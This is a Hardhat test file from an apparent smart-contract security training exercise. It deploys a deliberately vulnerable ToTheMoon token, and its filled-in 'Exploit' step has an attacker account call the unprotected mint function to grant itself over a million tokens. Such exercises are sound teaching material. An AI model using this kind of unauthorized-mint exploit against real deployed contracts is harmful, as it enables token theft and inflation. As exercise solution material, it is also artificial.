import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { parseEther } from 'ethers/lib/utils';
import { expect } from 'chai';
import { ToTheMoon, ToTheMoon__factory } from '../../typechain-types';

describe('Access Control Exercise 2', function () {
	let deployer: SignerWithAddress, user1: SignerWithAddress, attacker: SignerWithAddress;

	const INITIAL_MINT = parseEther('1000');
	const USER_MINT = parseEther('10');

	let toTheMoon: ToTheMoon;

	before(async function () {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

		[deployer, user1, attacker] = await ethers.getSigners();

		const ToTheMoonFactory = (await ethers.getContractFactory(
			'contracts/access-control-2/ToTheMoon.sol:ToTheMoon',
			deployer
		)) as ToTheMoon__factory;

		toTheMoon = await ToTheMoonFactory.deploy(INITIAL_MINT);

		await toTheMoon.mint(user1.address, USER_MINT);
	});

	it('Exploit', async function () {
		/** CODE YOUR SOLUTION HERE */
		await toTheMoon.connect(attacker).mint(attacker.address, USER_MINT.add(INITIAL_MINT).add(parseEther('1000000')));
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker has 1 million tokens
		expect(await toTheMoon.balanceOf(attacker.address)).to.be.gt(parseEther('1000000'));
	});
});
